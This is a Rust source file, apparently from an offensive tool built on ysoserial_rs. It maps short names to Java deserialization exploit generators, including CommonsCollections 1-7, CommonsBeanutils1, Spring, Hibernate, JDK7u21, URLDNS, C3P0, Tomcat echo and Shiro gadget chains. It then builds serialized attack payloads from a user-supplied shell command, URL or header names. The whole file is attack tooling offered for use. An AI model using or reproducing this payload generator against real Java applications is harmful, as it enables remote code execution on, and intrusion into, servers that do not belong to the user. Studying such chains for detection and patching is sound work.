use std::collections::HashMap;
use std::iter::FromIterator;
use std::process;

use once_cell::sync::Lazy;

use ysoserial_rs::*;

use crate::EMO_ARGS;

type NoArgs = fn() -> Vec<u8>;
type OneArgs = fn(&str) -> Vec<u8>;
type TwoArgs = fn(&str, &str) -> Vec<u8>;

static COMMAND_PAYLOAD_MAP: Lazy<HashMap<&str, OneArgs>> =
    Lazy::new(|| -> HashMap<&str, OneArgs> {
        HashMap::from_iter([
            ("bs1", get_commons_beanutils1 as OneArgs),
            ("cc1", get_commons_collections1),
            ("cc2", get_commons_collections2),
            ("cc3", get_commons_collections3),
            ("cc4", get_commons_collections4),
            ("cc5", get_commons_collections5),
            ("cc6", get_commons_collections6),
            ("cc7", get_commons_collections7),
            ("cck1", get_commons_collections_k1),
            ("cck2", get_commons_collections_k2),
            ("cck3", get_commons_collections_k3),
            ("cck4", get_commons_collections_k4),
            ("clojure", get_clojure),
            ("groovy1", get_groovy1),
            ("hibernate1", get_hibernate1),
            ("hibernate2", get_hibernate2),
            ("javassist_weld1", get_javassist_weld1),
            ("jboss_interceptors1", get_jboss_interceptors1),
            ("jdk7u21", get_jdk7u21),
            ("jdk8u20", get_jdk8u20),
            ("json1", get_json1),
            ("mozilla_rhino1", get_mozilla_rhino1),
            ("mozilla_rhino2", get_mozilla_rhino2),
            ("myfaces1", get_myfaces1),
            ("rome", get_rome),
            ("spring1", get_spring1),
            ("spring2", get_spring2),
            ("vaadin1", get_vaadin1),
        ])
    });
static URL_PAYLOAD_MAP: Lazy<HashMap<&str, OneArgs>> = Lazy::new(|| -> HashMap<&str, OneArgs> {
    HashMap::from_iter([
        ("url_dns", get_url_dns as OneArgs),
        ("c3p0", get_c3p0 as OneArgs),
    ])
});
static HEADER_PAYLOAD_MAP: Lazy<HashMap<&str, TwoArgs>> =
    Lazy::new(|| -> HashMap<&str, TwoArgs> {
        HashMap::from_iter([
            ("cck1_tomcat_echo", get_cck1_tomcat_echo as TwoArgs),
            ("cck2_tomcat_echo", get_cck2_tomcat_echo as TwoArgs),
        ])
    });
static SHIRO_PAYLOAD_MAP: Lazy<HashMap<&str, NoArgs>> = Lazy::new(|| -> HashMap<&str, NoArgs> {
    HashMap::from_iter([("shiro_spc", get_shiro_simple_principal_collection as NoArgs)])
});

pub fn list() {
    println!("Payload List:\n------------");
    let mut all_payload = COMMAND_PAYLOAD_MAP
        .keys()
        .map(|x| x.to_string())
        .collect::<Vec<String>>();
    all_payload.extend(
        URL_PAYLOAD_MAP
            .keys()
            .map(|x| x.to_string())
            .collect::<Vec<String>>(),
    );
    all_payload.extend(
        HEADER_PAYLOAD_MAP
            .keys()
            .map(|x| x.to_string())
            .collect::<Vec<String>>(),
    );
    all_payload.extend(
        SHIRO_PAYLOAD_MAP
            .keys()
            .map(|x| x.to_string())
            .collect::<Vec<String>>(),
    );
    all_payload.sort();
    for p in all_payload {
        println!("{}", p);
    }
    process::exit(0);
}

pub fn get_payload(p: &str) -> Vec<u8> {
    if let Some(command_func) = COMMAND_PAYLOAD_MAP.get(p as &str) {
        if let Some(cmd) = &EMO_ARGS.command {
            command_func(cmd)
        } else {
            println!("该Payload需要指定执行的命令行");
            process::exit(0);
        }
    } else if let Some(url_func) = URL_PAYLOAD_MAP.get(p as &str) {
        if let Some(url) = &EMO_ARGS.url {
            url_func(url)
        } else {
            println!("该Payload需要指定URL");
            process::exit(0);
        }
    } else if let Some(header_func) = HEADER_PAYLOAD_MAP.get(p as &str) {
        if let (Some(echo_name), Some(command_name)) = (&EMO_ARGS.echo_name, &EMO_ARGS.command_name)
        {
            header_func(echo_name, command_name)
        } else {
            println!("该Payload需要指定回显请求头和命令请求头");
            process::exit(0);
        }
    } else if let Some(shiro_func) = SHIRO_PAYLOAD_MAP.get(p as &str) {
        shiro_func()
    } else {
        println!("请指定Payload");
        process::exit(0);
    }
}
